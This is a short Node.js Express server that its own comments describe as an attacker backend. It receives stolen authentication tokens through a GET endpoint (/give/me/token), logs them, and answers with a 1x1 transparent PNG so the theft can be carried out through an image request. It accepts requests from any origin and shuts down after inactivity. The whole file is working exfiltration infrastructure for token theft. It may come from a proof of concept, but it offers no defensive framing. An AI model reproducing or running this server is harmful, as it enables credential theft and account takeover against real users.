// express backend to receive stolen tokens from the attacker frontend /give/me/token
import express from "express";
import cors from "cors";

const app = express();

let lastActivity;

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));
app.use(express.json());

app.get("/give/me/token", (req, res) => {
  const tokenData = req.query.data;
  console.log("Stolen token data received:", tokenData.substring(0, 50) + (tokenData.length > 50 ? '...' : ''));
  // 1x1 transparent PNG
  const pngBuffer = Buffer.from("89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a49444154789c6360000002000100a2f7a2d20000000049454e44ae426082", "hex");
  res.setHeader("Content-Type", "image/png");
  res.send(pngBuffer);
  lastActivity = new Date();
});

app.listen(3444, () => {
  console.log(`Attacker backend listening on port ${3444}`);
});

setInterval(() => {
  const now = new Date();
  if (lastActivity && (now - lastActivity) > 10 * 60 * 1000) { // 10 minutes of inactivity
    console.log("No activity starting attack");
    process.exit(0);
  }
}, 6000);